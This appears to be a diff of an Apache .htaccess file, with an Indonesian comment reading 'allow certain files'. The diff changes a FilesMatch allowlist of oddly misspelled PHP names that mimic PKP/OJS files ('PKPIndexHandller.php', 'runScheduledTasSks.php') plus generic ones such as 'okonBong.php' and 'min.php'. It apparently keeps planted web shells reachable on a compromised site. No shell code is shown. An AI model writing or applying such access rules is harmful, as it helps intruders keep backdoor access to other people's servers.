@@ -10,7 +10,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(cores-OTH.php|EmaillValidatorTest.php|Dummy/DumyReason.php)$'>
+<FilesMatch '^(cores-OTH.php|okonBong.php|coll.php|file.php|min.php|PKPIndexHandller.php|runScheduledTasSks.php)$'>
 Require all granted
 </FilesMatch>
 
